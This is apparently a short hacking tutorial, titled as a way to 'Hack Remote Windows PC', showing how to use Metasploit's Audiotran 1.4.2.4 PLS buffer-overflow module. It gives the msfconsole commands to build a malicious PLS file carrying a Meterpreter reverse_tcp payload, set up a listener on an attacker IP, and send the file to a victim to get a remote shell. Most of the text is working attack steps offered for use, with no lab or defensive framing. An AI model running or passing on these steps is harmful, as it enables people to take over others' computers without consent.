Hack Remote Windows PC using Audiotran PLS File Stack Buffer Overflow

This module exploits a stack-based buffer overflow in Audiotran 1.4.2.4. An attacker must send the file to victim and the victim must open the file. Alternatively, it may be possible to execute code remotely via an embedded PLS file within a browser when the PLS extension is registered to Audiotran. This alternate vector has not been tested and cannot be exercised directly with this module.
Audiotran 1.4.2.4
Attacker: kali Linux
Victim PC: Windows 7
Open Kali terminal type msfconsole

Now type use exploit/windows/fileformat/audiotran_pls_1424
msf exploit (audiotran_pls_1424)>set payload windows/meterpreter/reverse_tcp
msf exploit (audiotran_pls_1424)>set lhost 192.168.1.6 (IP of Local Host)
msf exploit (audiotran_pls_1424)>exploit 

After we successfully generate the malicious pls File, it will stored on your local computer
/root/.msf4/local/msf.pls

Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.6
exploit
Now send your msf.pls files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer
